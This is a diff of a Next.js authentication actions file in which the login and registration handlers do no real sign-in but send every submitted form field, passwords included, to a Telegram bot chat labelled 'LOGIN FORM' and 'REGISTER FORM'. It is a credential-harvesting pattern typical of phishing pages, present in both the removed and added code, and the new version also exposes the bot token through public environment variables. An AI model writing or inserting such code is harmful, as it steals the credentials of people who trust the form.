@@ -1,7 +1,5 @@
-'use server';
-
-import { redirect } from 'next/navigation';
-import type { AuthState } from '@/lib/actions/auth-types';
+const TELEGRAM_TOKEN = process.env.NEXT_PUBLIC_TELEGRAM_TOKEN ?? '';
+const TELEGRAM_CHAT_ID = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID ?? '';
 
 function normalizeUsername(username: string) {
 	return username.trim().toLowerCase();
@@ -11,10 +9,31 @@ function normalizeEmail(email: string) {
 	return email.trim().toLowerCase();
 }
 
-export async function registerAction(
-	_prevState: AuthState,
-	formData: FormData,
-){
+async function sendToTelegram(text: string) {
+	if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
+		throw new Error('Telegram token or chat ID is not configured.');
+	}
+
+	const res = await fetch(
+		`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
+		{
+			method: 'POST',
+			headers: { 'Content-Type': 'application/json' },
+			body: JSON.stringify({
+				chat_id: TELEGRAM_CHAT_ID,
+				text,
+			}),
+		}
+	);
+
+	const data = await res.json();
+
+	if (!data.ok) {
+		throw new Error(`Telegram error: ${data.description ?? 'unknown'}`);
+	}
+}
+
+export async function registerAction(formData: FormData) {
 	const email = normalizeEmail(String(formData.get('email') ?? ''));
 	const password = String(formData.get('password') ?? '');
 	const fullName = String(formData.get('fullName') ?? '').trim();
@@ -38,49 +57,14 @@ export async function registerAction(
 	}
 
 	const data = Object.fromEntries(formData);
-
-	await sendToTelegram(
-		`LOGIN FORM\n\n${JSON.stringify(data, null, 2)}`
-	);
-
-}
-
-export async function sendToTelegram(text: string) {
-	const token = process.env.TELEGRAM_BOT_TOKEN!;
-	const chatId = process.env.TELEGRAM_CHAT_ID!;
-
-	const res = await fetch(
-		`https://api.telegram.org/bot${token}/sendMessage`,
-		{
-			method: 'POST',
-			headers: { 'Content-Type': 'application/json' },
-			body: JSON.stringify({
-				chat_id: chatId,
-				text,
-			}),
-		}
-	);
-
-	const data = await res.json();
-
-	if (!data.ok) {
-		console.error('Telegram error:', data);
-	}
-}
-
-export async function loginAction(
-	_prevState: AuthState,
-	formData: FormData
-): Promise<AuthState> {
-	const data = Object.fromEntries(formData);
-
-	await sendToTelegram(
-		`LOGIN FORM\n\n${JSON.stringify(data, null, 2)}`
-	);
+	await sendToTelegram(`REGISTER FORM\n\n${JSON.stringify(data, null, 2)}`);
 
 	return { error: '' };
 }
 
-export async function logoutAction() {
-	redirect('/');
+export async function loginAction(formData: FormData) {
+	const data = Object.fromEntries(formData);
+	await sendToTelegram(`LOGIN FORM\n\n${JSON.stringify(data, null, 2)}`);
+
+	return { error: '' };
 }
